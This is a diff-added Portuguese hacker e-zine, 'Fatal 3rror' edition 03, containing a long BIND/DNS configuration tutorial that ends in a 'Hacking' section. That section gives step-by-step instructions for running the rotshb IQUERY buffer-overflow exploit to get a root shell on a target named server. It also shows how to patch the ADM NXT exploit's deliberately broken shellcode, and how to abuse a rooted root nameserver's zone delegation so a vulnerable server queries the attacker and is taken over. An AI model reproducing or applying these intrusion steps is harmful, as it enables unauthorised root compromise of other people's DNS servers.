@@ -1,0 +1,3363 @@
+       ________________________     _______________________________
+      /  __________  _______  /    /_____   _____by_Cheat_Struck__/
+     /  /__ ___   / /___   / /       ___/  /___   ___   __   ___
+    /  ___// o \ / // o \ / /       /__   // o \ / o \ /  \ / o \
+   /  /   / _  // // _  // /___  _____/  // _  // _  // O // _  /
+  /__/   / //_// // //_//_____/ /_______// / \_\ / \_\\__// / \_\
+         )/    )/ )/                     )/    )/         )/
+         '     '  '                      '     '          '
+
+                 Try hack your head. Maybe you don't die.
+
+                 Fatal 3rror
+                 Edition.......03
+                 Date..........1/11/0
+                 By............Cheat Struck
+                 Email.........cheat@struck.8m.com
+                 Page..........http://struck.8m.com/f3
+
+        _xXXXP^''                    ``^YXXXx_
+     _xXXXXP~        00 - T0PiCZ         ~YXXXXx_
+  _xXXXXXX(                                )XXXXXXx_
+xXXXXXXXXXXbxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxdXXXXXXXXXXx
+YXXXXXXXXXXP^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^YXXXXXXXXXXP
+  ~YXXXXXX(                                )XXXXXXP~
+     ~YXXXXb_        Cheat  Struck       _dXXXXP~
+        ~YXXXbx..                    ..xdXXXP~
+
+ .od[ 00 ]bo.    T0PiCZ                        / Cheat Struck
+ .od[ 01 ]bo.    Introduzindo (hmmm...)        / Cheat Struck
+ .od[ 02 ]bo.    TiPZ                          / Cheat Struck
+ .od[ 03 ]bo.    DNS                           / Cheat Struck
+ .od[ 04 ]bo.    Bash                          / syscall
+ .od[ 05 ]bo.    Firewalking                   / syscall
+ .od[ 06 ]bo.    NSBACKDOOR v3.7               / Cheat Struck
+ .od[ 07 ]bo.    Routeadores                   / Carti
+ .od[ 08 ]bo.    Manifesto                     / Cheat Struck
+ .od[ 09 ]bo.    Sniffing Simples parte 2      / Cheat Struck
+ .od[ 10 ]bo.    Wu-ftpd Scanning              / Cheat Struck
+ .od[ 11 ]bo.    Back Channel                  / Carti
+ .od[ 12 ]bo.    Escuta em cells digitais      / Cheat Struck and Gbyte
+ .od[ 13 ]bo.    Escutas via modem             / Cheat Struck
+ .od[ 14 ]bo.    Quando conheci um hacker...   / Cheat Struck
+ .od[ 15 ]bo.    Brasnet Sniffed               / psaux
+ .od[ 16 ]bo.    Mandic Hacked                 / Cheat Struck
+ .od[ 17 ]bo.    Destruindo Terminais          / Cheat Struck
+ .od[ 18 ]bo.    SuperProgs - Unshadow v1.66   / Cheat Struck
+ .od[ 19 ]bo.    Emails                        / Cheat Struck
+ .od[ 20 ]bo.    De Ende                       / Cheat Struck
+
+        _xXXXP^''                    ``^YXXXx_
+     _xXXXXP~     01 - Introduzindo      ~YXXXXx_
+  _xXXXXXX(                                )XXXXXXx_
+xXXXXXXXXXXbxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxdXXXXXXXXXXx
+YXXXXXXXXXXP^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^YXXXXXXXXXXP
+  ~YXXXXXX(                                )XXXXXXP~
+     ~YXXXXb_        Cheat  Struck       _dXXXXP~
+        ~YXXXbx..                    ..xdXXXP~
+
+   Esclarecendo algumas coisas...
+   Primeiro... 6 c lembram q eu falei na f30-01 q a DK havia acabado.
+Bem... ateh o momento da publicacao da edicao issu era real, soh q para
+a felicidade de alguns e infelicidade de outros, a DK voltou a ativa.
+Seu ultimo zine ja esta na www.deathknights.com.
+   Outra coisa...
+   Tipo... os textos sobre buff overflows tiveram varias fontes de pes-
+quisa. Eu peguei os melhores meios de explica-lo (como o sc do Aleph1 e
+um prog teste do Mixter) e expliquei-os com minhas proprias palavras de
+um modo q eu creio tenha sido o + claro possivel.
+   Foda-se c fikou parecido, como nao vai fikar ja q tratam do mesmo
+assunto?? O negocio eh q nenhum txt (escrito por mim) foi copia direta
+de um outro. Todos os textos foram feitos depois de horas de pesquisa
+e nao gosto q me tirem pra kiddie.
+   Nesta edicao eu meio que abusei no tamanho de alguns textos e outros
+(para poupar tempo) apenas coloquei textos antigos privates feitos por
+mim ja' que estou correndo para poder lancar a zine a tempo.
+   Eh issu ae... o nivel continua subindo e espero estar fazendo uma
+zine cada vez melhor pro 6. Enjoy!
+
+        _xXXXP^''                    ``^YXXXx_
+     _xXXXXP~         02 - TiPZ          ~YXXXXx_
+  _xXXXXXX(                                )XXXXXXx_
+xXXXXXXXXXXbxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxdXXXXXXXXXXx
+YXXXXXXXXXXP^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^YXXXXXXXXXXP
+  ~YXXXXXX(                                )XXXXXXP~
+     ~YXXXXb_        Cheat  Struck       _dXXXXP~
+        ~YXXXbx..                    ..xdXXXP~
+
+  Autores dessa edicao:
+  ---------------------
+
+Cheat Struck   <cheat@struck.8m.com>
+syscall        <>
+Carti          <>
+Gbyte          <>
+psaux          <psaux@email.com>
+
+  Onde baixar a Fatal 3rror???
+  ----------------------------
+
+http://members.xoom.com/cszine/f3
+http://struck.8m.com/f3
+
+  Extraindo a f3 e seus programas:
+  --------------------------------
+
+[root@localhost ~]# tar -zxvf f3-03.tgz
+f3/
+f3/f3-02.txt
+f3/extract.c
+[root@localhost ~]# cd f3
+[root@localhost f3]# gcc extract.c -o extract
+[root@localhost f3]# ./extract f3-03.txt
+- Extracting nsback/nsb37.c
+- Extracting sniff/pfs.c
+- Extracting wuscan/wuscan.pl
+- Extracting Superprogs/unshad.c
+[root@localhost f3]#
+
+        _xXXXP^''                    ``^YXXXx_
+     _xXXXXP~          03 - DNS          ~YXXXXx_
+  _xXXXXXX(                                )XXXXXXx_
+xXXXXXXXXXXbxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxdXXXXXXXXXXx
+YXXXXXXXXXXP^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^YXXXXXXXXXXP
+  ~YXXXXXX(                                )XXXXXXP~
+     ~YXXXXb_        Cheat  Struck       _dXXXXP~
+        ~YXXXbx..                    ..xdXXXP~
+
+                  DNS - Configuracao `a Burlacao.
+                        by Cheat Struck
+
+Topicos:
+1. Introducao
+2. O que eh DNS???
+3. Configuracao do named
+  3.1. resolv.conf
+  3.2. named.conf
+  3.3. nsswitch.conf
+  3.4. host.conf
+4. Iniciando o named
+  4.1. ndc
+  4.2. nslookup
+5. Forwarder
+6. Criando dominios
+  6.1. Sistema de busca a dominios
+  6.2. Seu proprio dominio
+7. Hacking
+  7.1. IQUERY Bug
+  7.2. NXT Bug
+    7.2.1. pre-requesitos
+    7.2.2. Arrumando o xploit
+    7.2.3. Fazendo o server dar query em vc
+  7.3. Outros Bugz
+  7.4. Cuidados Pos-Hacking
+8. Spoofing
+9. Quero Mais!
+10. Fin
+
+#############
+1. Introducao
+#############
+
+   Recentemente varios amigos me pediram para escrever sobre dns, named,
+bind, domain (como voce preferir chamar). Como DNS nao eh somente um daemon
+xploitavel, decidi fazer um mini-HOWTO sobre tudo que tem de interessante
+nissu. Vou comecar do basico e ir avancando para ninguem se perder.
+   Algumas fontes foram tiradas do DNS-HOWTO oficial da freebsd e de
+man-pages do linux. Programas de terceiros podem ser citados aki.
+   O manual eh bem grande, por issu deixe para le-lo numa tarde quando
+voce nao tiver nada pra fazer.
+
+##################
+2. O que eh DNS???
+##################
+
+   DNS significa Domain Name System. Precisa traduzir??? Sistema de nomes
+de dominios. O que ele faz eh basicamente converter nomes a IPs de
+maquinas. Exemplo:
+
+32.96.111.130      <- www.fbi.gov
+
+   O NS nos UNIXes eh feito atravez de um programa chamado named. O named
+vem com o pacote do BIND junto a outros programas relacionados a NS.
+   Atualmente existem duas distribuicoes do BIND. Versoes 4 e 8. FreeBSDs
+costumam usar versoes 4 (ex. 4.9.5) assim como algumas distribuicoes
+antigas do Linux. Os mais recentes usam versoes 8 (ex. 8.2.1).
+   Para descobrir qual esta instalada na sua maquina verifique se existe o
+arquivo /etc/named.conf (BIND 8) ou /etc/named.boot (BIND 4). Neste texto
+irei me referir a maior parte do tempo ao BIND 8.
+
+########################
+3. Configuracao do named
+########################
+
+   O named funciona como um banco de dados. Ele arquiva informacoes de
+outras maquinas para uma futura procura.
+   Aki veremos alguns arquivos padroes de configuracao do named.
+
+################
+3.1. resolv.conf
+################
+
+   Isso eh uma das 1as coisas que usuarios de unix aprendem antes de
+conectarem a internet. Voce precisa especificar no minimo um servidor dns
+no arquivo /etc/resolv.conf.
+   Como estamos configurando nossa maquina para servir de name server
+o arquivo deve estar +/- assim:
+
+search localhost
+nameserver 127.0.0.1
+
+   No nameserver voce coloca o ip do name server. 127.0.0.1 para quem nao
+sabe ainda eh um loopback (ou seja eh sua propria maquina).
+   O search funciona como uma chave indicando onde procurar pelo
+endereco primeiro. Ou seja, se voce quizer entrar no endereco hack.com
+primeiro vai procurar hack.com.localhost.localdomain e se nao encontrar
+procura hack.com.
+   Voce pode colocar mais de um host nesta chave mas isso prejudicara a
+velocidade da conexao. Exemplo:
+
+search localhost feio.org bunito.com
+
+   Tomando o exemplo acima, caso voce queria acessar foo.edu:
+- Procurando foo.edu.localhost
+- Procurando foo.edu.feio.org
+- Procurando foo.edu.bunito.com
+- Procurando foo.edu
+
+   Entendeu porque essa chave pode afetar a velocidade da conexao??
+
+###############
+3.2. named.conf
+###############
+
+   Ao iniciar o named ele ira ler o arquivo /etc/named.conf onde estao as
+configuracoes deste programa. Vamos ver algumas partes deste arquivo:
+
+options {
+        directory "/var/named";
+};
+
+   Muito simples. Apenas indica o diretorio onde o named ira procura pelos
+arquivos.
+
+zone "." {
+        type hint;
+        file "named.ca";
+};
+zone "0.0.127.in-addr.arpa" {
+        type master;
+        file "named.local";
+};
+
+   Primeiro indicamos o arquivo que guarda dados de outros name servers.
+Todos os arquivos ficarao no diretorio indicado anteriormente. Sendo assim o
+arquivo fica em /var/named/named.ca. O segundo indica o arquivo
+/var/named/named.local.
+   Mais alem veremos como configurar estes arquivos.
+   Toda a vez que voce precisar mudar o named.conf, voce precisa-ra
+reiniciar o named para que este de efeito.
+
+##################
+3.3. nsswitch.conf
+##################
+
+   Este arquivo tambem se encontra no diretorio /etc (/etc/nsswitch.conf).
+Aqui voce configura o local e modo de procura por dados. Explicar o
+funcionamento deste arquivo foge do objetivo deste texto.
+   Encontre a seguinte linha (pode haver variacoes):
+
+hosts:      files dns
+
+   Se nao tiver nenhuma linha comecando com 'hosts:' entao adicione-a. Ela
+indica que os programas primeiro vao olhar no arquivo /etc/hosts e depois
+checar no /etc/resolv.conf.
+
+##############
+3.4. host.conf
+##############
+
+   O arquivo eh /etc/host.conf. Cuidado para nao confundi-lo com o
+/etc/hosts. Neste arquivo provavelmente contera a seguinte linha:
+
+order hosts,bind
+
+   Issu indica uma rotina de primeiro procurar no /etc/hosts e em seguida
+perguntar ao name server (indicado no resolv.conf).
+
+####################
+4. Iniciando o named
+####################
+
+   Depois de toda a configuracao, eh hora de inicia-lo.
+
+########
+4.1. ndc
+########
+
+   O programa /usr/sbin/ndc eh uma interface para o controle do named.
+Eh com ele que iniciaremos o named.
+
+~# ndc start
+Name Server Started
+~#
+
+   Se voce quizer monitorar o seu named, abra um novo terminal que nao va
+usar e digite 'tail -f /var/log/messages'. Issu abrira o arquivo de log
+do syslogd e as atividades do named serao impressas na tela.
+   Caso ocorra alguma mensagem de erro, kille o named verifique o arquivo
+com a falha e inicie o named novamente.
+   Se voce usa uma conexao dialup conecte-se primeiro.
+   Para reiniciar o named use o comando 'ndc restart'.
+
+#############
+4.2. nslookup
+#############
+
+   Rode o /usr/bin/nslookup para examinar o seu trabalho.
+
+~# nslookup
+Default Server:  localhost
+Address:  127.0.0.1
+
+>
+
+   Se o nslookup retornar isso, esta funfando. Caso contrario volte e
+verifique tudo novamente.
+   Depois que comecar a funcionar podemos continuar nosso trabalho. Vamos
+testa-lo dando query em um host qualquer.
+
+> pat.uio.no
+Server:  localhost
+Address:  127.0.0.1
+
+Name:    pat.uio.no
+Address:  129.240.130.16
+
+   O nslookup perguntou ao seu named pela maquina pat.uio.no. O named
+entao contatou um dos name servers que estao arquivados no seu
+/var/named/named.ca e pegou o IP da maquina.
+   Uma vez feito isso a informacao ficara arquivada no seu named. Tente
+dar query novamente e voce recebera uma resposta tipo:
+
+Non-authoritative answer:
+Name:    pat.uio.no
+Address:  129.240.130.16
+
+   Isso significa que o nome pat.uio.no ja esta arquivado no seu named, o
+que lhe poupara tempo.
+   Para sair do nslookup digite 'exit'.
+
+############
+5. Forwarder
+############
+
+   Se voce esta configgurando um provedor e este possui apenas 2 IPs
+como name server, voce pode redirecionar as conexoes por named a estes.
+   Digamos que seus ns sejam os IPs 10.0.0.1 e 10.1.0.1 entao edite o
+/etc/named.conf e na secao chamada 'options' adicione as seguintes linhas:
+
+           forward first;
+           forwarders {
+                10.0.0.1;
+                10.1.0.1;
+            };
+
+   Reinicie seu named e teste com o nslookup.
+
+###################
+6. Criando dominios
+###################
+
+   Com um named rodando e ja configurado voce eh capaz de criar um dominio
+para a sua maquina como por exemplo i.hate.all.haxors. Isso eh o que nos
+veremos nessa secao.
+
+################################
+6.1. Sistema de busca a dominios
+################################
+
+   Primeiro vamos entender o funcionamento do DNS. Digamos que voce esta
+atraz do endereco prep.ai.mit.edu. A primeira busca do DNS eh no servidor
+. (root). Ele pergunta ao servidor . (estao listados em /var/named/named.ca)
+e este lhe dara uma lista de servidores edu.
+   Vamos ver como fazer isto com o nslookup:
+
+~# nslookup
+Default Server:  localhost
+Address:  127.0.0.1
+
+> server c.root-servers.net.
+Default Server:  c.root-servers.net
+Address:  192.33.4.12
+
+> set q=ns
+> edu.
+edu     nameserver = A.ROOT-SERVERS.NET
+edu     nameserver = H.ROOT-SERVERS.NET
+edu     nameserver = B.ROOT-SERVERS.NET
+edu     nameserver = C.ROOT-SERVERS.NET
+edu     nameserver = D.ROOT-SERVERS.NET
+edu     nameserver = E.ROOT-SERVERS.NET
+edu     nameserver = I.ROOT-SERVERS.NET
+edu     nameserver = F.ROOT-SERVERS.NET
+edu     nameserver = G.ROOT-SERVERS.NET
+A.ROOT-SERVERS.NET      internet address = 198.41.0.4
+H.ROOT-SERVERS.NET      internet address = 128.63.2.53
+B.ROOT-SERVERS.NET      internet address = 128.9.0.107
+C.ROOT-SERVERS.NET      internet address = 192.33.4.12
+D.ROOT-SERVERS.NET      internet address = 128.8.10.90
+E.ROOT-SERVERS.NET      internet address = 192.203.230.10
+I.ROOT-SERVERS.NET      internet address = 192.36.148.17
+F.ROOT-SERVERS.NET      internet address = 192.5.5.241
+G.ROOT-SERVERS.NET      internet address = 192.112.36.4
+
+   Okay. Da um pause e deixa eu explicar o que fizemos ate' aqui. Primeiro
+nos conectamos a um servidor . (root). Em seguida setamos o query para
+receber dados de name servers. E finalmente pergunta pelo edu.
+   O . depois do edu e' essencial para indicar ao nslookup a posicao em
+que o edu se encontra (no final e nao em qualquer local do dominio).
+   Nos obtivemos a lista de servidores que servem EDU. Agora precisamos
+saber quais servem mit.edu:
+
+> mit.edu.
+Server:  c.root-servers.net
+Address:  192.33.4.12
+
+Non-authoritative answer:
+mit.edu nameserver = W20NS.mit.edu
+mit.edu nameserver = BITSY.mit.edu
+mit.edu nameserver = STRAWB.mit.edu
+
+Authoritative answers can be found from:
+W20NS.mit.edu   internet address = 18.70.0.160
+BITSY.mit.edu   internet address = 18.72.0.3
+STRAWB.mit.edu  internet address = 18.71.0.151
+
+   W20NS, BITSY e STRAWB servem mit.edu, escolhemos um e procuramos pela
+proxima fase do dominio: ai.mit.edu:
+
+> server W20NS.mit.edu.
+Default Server:  W20NS.mit.edu
+Address:  18.70.0.160
+
+> ai.mit.edu.
+Server:  W20NS.mit.edu
+Address:  18.70.0.160
+
+Non-authoritative answer:
+ai.mit.edu      nameserver = ALPHA-BITS.AI.MIT.EDU
+ai.mit.edu      nameserver = GRAPE-NUTS.AI.MIT.EDU
+ai.mit.edu      nameserver = TRIX.AI.MIT.EDU
+ai.mit.edu      nameserver = MUESLI.AI.MIT.EDU
+ai.mit.edu      nameserver = LIFE.AI.MIT.EDU
+ai.mit.edu      nameserver = BEET-CHEX.AI.MIT.EDU
+ai.mit.edu      nameserver = MINI-WHEATS.AI.MIT.EDU
+ai.mit.edu      nameserver = COUNT-CHOCULA.AI.MIT.EDU
+ai.mit.edu      nameserver = MINTAKA.LCS.MIT.EDU
+
+Authoritative answers can be found from:
+AI.MIT.EDU      nameserver = ALPHA-BITS.AI.MIT.EDU
+AI.MIT.EDU      nameserver = GRAPE-NUTS.AI.MIT.EDU
+AI.MIT.EDU      nameserver = TRIX.AI.MIT.EDU
+AI.MIT.EDU      nameserver = MUESLI.AI.MIT.EDU
+AI.MIT.EDU      nameserver = LIFE.AI.MIT.EDU
+AI.MIT.EDU      nameserver = BEET-CHEX.AI.MIT.EDU
+AI.MIT.EDU      nameserver = MINI-WHEATS.AI.MIT.EDU
+AI.MIT.EDU      nameserver = COUNT-CHOCULA.AI.MIT.EDU
+AI.MIT.EDU      nameserver = MINTAKA.LCS.MIT.EDU
+ALPHA-BITS.AI.MIT.EDU   internet address = 128.52.32.5
+GRAPE-NUTS.AI.MIT.EDU   internet address = 128.52.36.4
+TRIX.AI.MIT.EDU internet address = 128.52.37.6
+MUESLI.AI.MIT.EDU       internet address = 128.52.39.7
+LIFE.AI.MIT.EDU internet address = 128.52.32.80
+BEET-CHEX.AI.MIT.EDU    internet address = 128.52.32.22
+MINI-WHEATS.AI.MIT.EDU  internet address = 128.52.54.11
+COUNT-CHOCULA.AI.MIT.EDU        internet address = 128.52.38.22
+MINTAKA.LCS.MIT.EDU     internet address = 18.26.0.36
+
+   Escolhemos qualquer um dinovo.
+   Como ja encontramos os name servers do ai.mit.edu, vamos mudar o tipo
+de query para conseguirmos todas informacoes sobre prep.ai.mit.edu.
+
+> server MUESLI.AI.MIT.EDU
+Default Server:  MUESLI.AI.MIT.EDU
+Address:  128.52.39.7
+
+> set q=any
+> prep.ai.mit.edu.
+Server:  MUESLI.AI.MIT.EDU
+Address:  128.52.39.7
+
+prep.ai.mit.edu CPU = dec/decstation-5000.25    OS = unix
+prep.ai.mit.edu
+        inet address = 18.159.0.42, protocol = tcp
+          ftp  telnet  smtp  finger
+prep.ai.mit.edu preference = 1, mail exchanger = gnu-life.ai.mit.edu
+prep.ai.mit.edu internet address = 18.159.0.42
+ai.mit.edu      nameserver = beet-chex.ai.mit.edu
+ai.mit.edu      nameserver = alpha-bits.ai.mit.edu
+ai.mit.edu      nameserver = mini-wheats.ai.mit.edu
+ai.mit.edu      nameserver = trix.ai.mit.edu
+ai.mit.edu      nameserver = muesli.ai.mit.edu
+ai.mit.edu      nameserver = count-chocula.ai.mit.edu
+ai.mit.edu      nameserver = mintaka.lcs.mit.edu
+ai.mit.edu      nameserver = life.ai.mit.edu
+gnu-life.ai.mit.edu     internet address = 128.52.32.60
+beet-chex.ai.mit.edu    internet address = 128.52.32.22
+alpha-bits.ai.mit.edu   internet address = 128.52.32.5
+mini-wheats.ai.mit.edu  internet address = 128.52.54.11
+trix.ai.mit.edu internet address = 128.52.37.6
+muesli.ai.mit.edu       internet address = 128.52.39.7
+count-chocula.ai.mit.edu        internet address = 128.52.38.22
+mintaka.lcs.mit.edu     internet address = 18.26.0.36
+life.ai.mit.edu internet address = 128.52.32.80
+
+   Issu ae. Vimos como o DNS procura por um endereco desde os servidores .
+ate chegar ao dominio que queremos. Lembre-se que depois de tudo isso os
+enderecos ficaram arquivados no seu named entao quando quizer acessar o
+dominio novamente nao tera que passar por tudo isso novamente.
+   O arquivo que indica os servidores . (roots) estao especificados no
+/etc/named.conf. Alem destes tb existe o dominio in-addr.arpa que tambem
+e' especificado no named.conf.
+   O dominio in-addr.arpa nos fornece o hostname quando temos o endereco.
+Nao quero me prolongar nissu entao aqui vai um esquema de como ele procura
+pelo endereco nos servidores. Estamos atraz do ip 204.32.119.24:
+
+- Procura por servidores in-addr.arpa.;
+- Procura por 204.in-addr.arpa.;
+- Procura por 32.204.in-addr.arpa.;
+- Procura por 119.32.204.in-addr.arpa.;
+- Encontra dados de 24.119.32.204.in-addr.arpa..
+
+   Note que a procura comeca pelo primeiro trio e assim vai ate' o final
+da procura o ip ficara de traz pra frente.
+
+########################
+6.2. Seu proprio dominio
+########################
+
+   Vamos criar o dominio eu.sou.lito.
+   Detalhe, no DNS letras maiusculas e minusculas nao se diferenciam como
+no linux. Sendo assim eu.sou.lito eh o mesmo que EU.SOU.LITO.
+   Comecamos editando as seguintes linhas no named.conf:
+
+zone "0.0.127.in-addr.arpa" {
+        type master;
+        file "named.local";
+};
+
+   Issu define que 0.0.127.in-addr.arpa e' nosso servidor mestre e esta
+arquivado em /var/named/named.local. Vamos ver esse arquivo:
+
+@       IN      SOA     localhost. root.localhost.  (
+                                      1          ; Serial
+                                      28800      ; Refresh
+                                      14400      ; Retry
+                                      3600000    ; Expire
+                                      86400 )    ; Minimum
+        IN      NS      localhost.
+1       IN      PTR     localhost.
+
+   Este "zone file" contem 3 tipos de dados: SOA, NS, PTR.
+
+* SOA (Start Of Authority): O @ indica a origem (0.0.127.in-addr.arpa).
+* NS (Name Server): Indica o name server do dominio 0.0.127.in-addr.arpa.
+* PTR: Indica que o endereco 1 na subnet (127.0.0.1) tem nome localhost.
+
+   Como vc percebeu o SOA eh o unico q eh meio complicado neh...
+
+localhost.              = Name Server;
+root.localhost.         = responsavel pelo dominio (root@localhost);
+1       ; Serial        = Versao do zone file;
+
+   O resto nao importa. =)
+   Agora vamos inserir o dominio eu.sou.lito... Para isso edite novamente
+o /etc/named.conf:
+
+zone "eu.sou.lito" {
+        notify no;
+        type master;
+        file "eu.sou.lito";
+};
+
+   Note que indicamos o zone file do dominio como /var/named/eu.sou.lito.
+   Vamos edita-lo:
+
+@       IN      SOA     eu.sou.lito. root.eu.sou.lito. (
+                                      1997022700 ; Serial
+                                      28800      ; Refresh
+                                      14400      ; Retry
+                                      604800     ; Expire
+                                      86400 )    ; Minimum
+                NS      ns                      ; Inet Address of name server
+                MX      10 mail.eu.sou.lito.    ; Primary Mail Exchanger
+                MX      20 root.localhost.      ; Secondary Mail Exchanger
+localhost       A       127.0.0.1
+ns              A       192.168.196.2
+mail            A       192.168.196.4
+
+   Note que depois do endereco deve conter o ponto. Se nao tiver (no caso
+do dado NS) sera interpretado a seguinte forma: ns.eu.sou.lito. Ou seja, o
+ponto indica o fim de um endereco. Caso ele nao esteja no final, o
+endereco sera completado com a origem (eu.sou.lito) setada no named.conf.
+   Aqui temos um novo tipo de dado:
+
+* MX (Mail eXchanger): Todos os email enviados para eu.sou.lito serao
+                       forwardos para mail@eu.sou.lito ou root@localhost.
+   Os numeros antes do endereco eh a prioridade que cada endereco tem.
+O numero menor (10) tem prioridade. Se o 1o endereco falhar 10 vezes
+entao comeca a tentar enviar para o 2o. Se falhar mais 10 vezes entao
+desiste.
+
+   Vamos ver se funfou. Reinicie o named e entao:
+
+~# nslookup
+> set q=any
+> eu.sou.lito
+Server:  localhost
+Address:  127.0.0.1
+
+eu.sou.lito
+       origin = eu.sou.lito
+       mail addr = root.eu.sou.lito
+       serial = 1997022700
+       refresh = 28800 (8 hours)
+       retry   = 14400 (4 hours)
+       expire  = 604800 (7 days)
+       minimum ttl = 86400 (1 day)
+eu.sou.lito     nameserver = ns.eu.sou.lito
+eu.sou.lito     preference = 10, mail exchanger = mail.eu.sou.lito
+eu.sou.lito     preference = 20, mail exchanger = root.localhost
+eu.sou.lito     nameserver = ns.eu.sou.lito
+ns.eu.sou.lito  internet address = 192.168.196.2
+mail.eu.sou.lito        internet address = 192.168.196.4
+
+##########
+7. Hacking
+##########
+
+   Acho que por hora ja esta bom o que voce aprendeu ate' aqui. Se voce
+quizer se aprofundar mais na configuracao de um name server procure pelos
+RFCs listados no fim deste HOWTO.
+   Agora eh hora da acao. Nos aprendemos como funciona um name server e
+como deixa-lo no ar. Agora vamos aprender como burla-lo.
+
+###############
+7.1. IQUERY Bug
+###############
+
+   Bug no Inverse Query que permite buffer overflow.
+
+* Versoes vulneraveis: 4.9.5-REL
+                       4.9.5-P1
+                       4.9.6-REL
+                       8.1-REL
+                       8.1.1
+
+* Primeiro xploit Publicado: rotshb.c
+
+* Como usar: No exemplo vamos xploitar uma maquina linux rodando named
+8.1.1 (se) localizada no ip 200.24.24.69...
+
+[root@localhost ~]# gcc rotshb.c -o rotshb
+[root@localhost ~]# ./rotshb
+
+target types:
+ 0  : x86 Linux 2.0.x named 4.9.5-REL (se)
+ 1  : x86 Linux 2.0.x named 4.9.5-REL (le)
+ 2  : x86 Linux 2.0.x named 4.9.5-P1 (se)
+ 3  : x86 Linux 2.0.x named 4.9.5-P1 (le)
+ 4  : x86 Linux 2.0.x named 4.9.6-REL (se)
+ 5  : x86 Linux 2.0.x named 4.9.6-REL (le)
+ 6  : x86 Linux 2.0.x named 8.1-REL (se)
+ 7  : x86 Linux 2.0.x named 8.1-REL (le)
+ 8  : x86 Linux 2.0.x named 8.1.1 (se)
+ 9  : x86 Linux 2.0.x named 8.1.1 (le)
+ 10 : x86 FreeBSD 3.x named 4.9.5-REL (se)
+ 11 : x86 FreeBSD 3.x named 4.9.5-REL (le)
+ 12 : x86 FreeBSD 3.x named 4.9.5-P1 (se)
+ 13 : x86 FreeBSD 3.x named 4.9.5-P1 (le)
+ 14 : x86 FreeBSD 3.x named 4.9.6-REL (se)
+ 15 : x86 FreeBSD 3.x named 4.9.6-REL (le)
+
+error: usage: ./a.out <host> [tt] [opt] [ofst]
+[root@localhost ~]# ./rotshb 200.24.24.69 8
+-ROTShB
+(bla... bla... bla... )
+bash#
+
+   Nao tem segredo... o xploit e' auto-explicativo.
+
+############
+7.2. NXT Bug
+############
+
+   O xploit abre a porta 53 na maquina local e imita um nameserver. Quando
+alguem der query nele, ele envia um pacote NXT muito grande que causa
+o buffer overflow.
+   Este exploit causou certa polemica quando foi lancado por 2 motivos.
+   Primeiro por que ele inaugurou (entre aspas) o sistema anti-lamah
+forcando o exploiter (aquele que usa o xploit) alterar o shellcode para
+que este funciona-se como deveria.
+   E segundo por ele nao ser como a maioria dos xploits remotos que basta
+roda-lo apontando para a vitima e pah!
+
+* Versoes vulneraveis: 8.2
+                       8.2.1
+
+* Primeiro exploit: t666.c by ADM Crew
+
+* Como usar:
+   Para ficar mais facil a compreencao, optei por dividir esta explicacao
+e varias sub-secoes...
+
+#####################
+7.2.1. pre-requesitos
+#####################
+
+   Para este exploit funfar ele necessita de alguns pre-requisitos que
+explicarei agora.
+   A primeira coisa a fazer eh ter r00t em um name server . (root), aqueles
+listados em /var/named/named.ca.
+
+   Atencao!!! Este name server deve estar no banco de dados do servidor
+vulneravel, se nao nao rola. Para verificar use o programa dig.
+
+   Com r00t em um name server procure pelo arquivo responsavel pelo seu
+proprio dominio. Vamos trabalhar com exemplos para simplificar...
+   Nos temos r00t no name server NS.fuckme.com. Vamos ateh seu
+/etc/named.conf e procuramos por algo como:
+
+zone "fuckme.com"{
+      type master;
+      file "fuckme.com";
+};
+
+   Verifique tb nas options o diretorio dos arquivos:
+
+        directory "/var/named";
+
+   Otimo. Vamos ate' o arquivo /var/named/fuckme.com. Ja aprendemos como
+editar este arquivo, entao adicione um sub-dominio com um novo NS...
+
+merda              IN      NS      sua.maquina.
+
+   Mude sua.maquina pelo ip ou hostname da sua maquina (onde ira rodar o
+exploit). Lembre-se que o ponto no final do endereco eh necessario, caso
+contrario ficaria sua.maquina.fuckme.com. No caso do sub-dominio merda o
+resultado foi merda.fuckme.com.
+   Feito isto reinicie o named.
+
+#########################
+7.2.2. Arrumando o xploit
+#########################
+
+   Neste exploit foi usado um sistema anti-lamer para ele nao ser usado
+por script-kiddies. O segredo eh que no shellcode ao inves de chamar
+/bin/sh o xploit chamava /adm/sh e por issu nao funfava.
+   Como arrumar??
+   Procure por:
+
+0x2f,0x61,0x64,0x6d,0x2f
+
+   E mude por:
+
+0x2f,0x62,0x69,0x6e,0x2f
+
+   Depois compile e ja esta pronto pra ser usado...
+   Como o xploit abre a porta 53 para imitar um nameserver, o named deve
+ser killado antes de roda-lo.
+   Depois de roda-lo ele exibira na tela qdo alguma maquina tentar
+"queryar" a sua. Se os dados baterem o xploit age e voce ganha sua querida
+root shell.
+
+#######################################
+7.2.3. Fazendo o server dar query em vc
+#######################################
+
+   Depois de seguir os passos anteriores agora fika muito facil.
+   Lembra que voce tinha adicionado o sub-dominio merda.fuckme.com??
+   Lembra que o DNS deste sub-dominio era a sua maquina??
+   Entao voce soh precisa dar um query na maquina vulneravel pedindo
+informacoes sobre este sub-dominio e assim vai faze-la acessar a sua
+maquina. Vejamos na pratica (seguindo nosso exemplo anterior):
+
+$nslookup
+>server NS.maquina.vul.com
+>www.merda.fuckme.com
+
+   O que vai acontecer???
+- Voce seta NS.maquina.vul.com como seu servidor . de NS;
+- Voce da um query atras do url www.merda.fuckme.com;
+- O NS.maquina.vul.com procura em seu banco de dados pelo dominio
+fuckme.com e encontra outro NS para este (NS.fuckme.com);
+- O NS.maquina.vul.com da um query em NS.fuckme.com atraz do sub-
+dominio merda.fuckme.com;
+- O NS.fuckme.com diz para NS.maquina.vul.com que o Servidor
+responsavel por este sub-dominio eh a sua maquina.
+- O NS.maquina.vul.com da query na sua maquina e o xploit age.
+- R000000000000t!!!!!!!
+
+################
+7.3. Outros Bugz
+################
+
+   Os programadores do BIND sao tao descuidados que atualmente existem
+exploits 0-days para TODAS (repito: TODAS) as versoes do named. Isso
+mesmo. Eu lembro q qdo a ADM lancou o xploit para Bind 8.2 mta gente
+a muito ja o tinha.
+   Hj ja ouvi boatos que ateh mesmo a versao 9 do Bind ja tem xploit
+0-day. C voce olhar o source dos programas que vem com o pakote do named
+logo ira perceber a quantidade de bugs eles possuem.
